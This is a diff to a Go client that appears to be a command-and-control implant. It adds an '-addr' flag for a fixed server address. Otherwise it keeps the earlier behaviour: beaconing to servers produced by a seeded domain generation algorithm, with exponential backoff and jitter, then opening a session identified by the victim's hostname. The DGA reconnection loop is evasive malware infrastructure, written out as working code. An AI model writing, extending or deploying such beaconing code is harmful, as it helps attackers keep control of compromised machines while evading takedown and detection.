@@ -44,6 +44,7 @@ func main() {
     }
 
     id := flag.String("id", "", "client id, default hostname")
+    addr := flag.String("addr", "", "server address in host:port format")
     flag.Parse()
 
     if home, err := os.UserHomeDir(); err == nil {
@@ -68,7 +69,7 @@ func main() {
     rand.Seed(time.Now().UnixNano())
 
     for {
-        conn, picked := dialWithBackoff()
+        conn, picked := dialWithBackoff(*addr)
         log.Printf("connected to %s", picked)
 
         if err := runSession(*id, conn); err != nil {
@@ -82,13 +83,13 @@ func main() {
     }
 }
 
-func dialWithBackoff() (net.Conn, string) {
+func dialWithBackoff(addr string) (net.Conn, string) {
     attempt := 0
     backoff := 1 * time.Second
     maxBackoff := 30 * time.Second
 
     for {
-        for addr := range u.GenDomainsStream(dgaSeed, 16) {
+        if addr != "" {
             attempt++
             conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
             if err == nil {
@@ -96,6 +97,23 @@ func dialWithBackoff() (net.Conn, string) {
             }
 
             log.Printf("dial attempt #%d to %s failed: %v", attempt, addr, err)
+            sleepWithJitter(backoff, backoff*2)
+
+            backoff *= 2
+            if backoff > maxBackoff {
+                backoff = maxBackoff
+            }
+            continue
+        }
+
+        for genAddr := range u.GenDomainsStream(dgaSeed, 16) {
+            attempt++
+            conn, err := net.DialTimeout("tcp", genAddr, 5*time.Second)
+            if err == nil {
+                return conn, genAddr
+            }
+
+            log.Printf("dial attempt #%d to %s failed: %v", attempt, genAddr, err)
             sleepWithJitter(backoff, backoff*2)
         }
 
